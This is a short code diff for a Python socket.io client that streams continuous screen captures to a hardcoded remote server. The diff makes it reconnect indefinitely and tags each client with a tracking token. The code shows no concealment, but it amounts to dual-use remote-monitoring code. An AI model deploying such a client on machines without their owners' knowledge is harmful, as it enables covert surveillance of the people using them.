@@ -22,7 +22,7 @@ import hashlib
 # =========================================================
 # Replace the URL below with the Ngrok URL printed by server.py!
 # Example: SERVER_URL = "https://1a2b3c4d.ngrok-free.app"
-SERVER_URL = "PASTE_YOUR_NGROK_URL_HERE"
+SERVER_URL = "https://remotecontrolserver-3ahn.onrender.com"
 # =========================================================
 
 def generate_tracking_token():
@@ -39,8 +39,15 @@ def generate_tracking_token():
 # Generate the unique tracking parameter (the '?c=' value)
 CLIENT_ID = generate_tracking_token()
 
-# Initialize WebSocket Client
-sio = socketio.Client()
+# Initialize WebSocket Client with robust cloud settings
+sio = socketio.Client(
+    reconnection=True,
+    reconnection_attempts=0, # Try forever
+    reconnection_delay=1,
+    reconnection_delay_max=5,
+    logger=True,
+    engineio_logger=True
+)
 
 @sio.event
 def connect():
@@ -63,7 +70,7 @@ def disconnect():
 def start_streaming():
     """Captures the computer screen continuously and uploads it to the server."""
     try:
-        sio.connect(SERVER_URL)
+        sio.connect(SERVER_URL, transports=['websocket', 'polling'])
     except Exception as e:
         print(f"[!] Could not connect to {SERVER_URL}. Is the server running?")
         sys.exit(1)
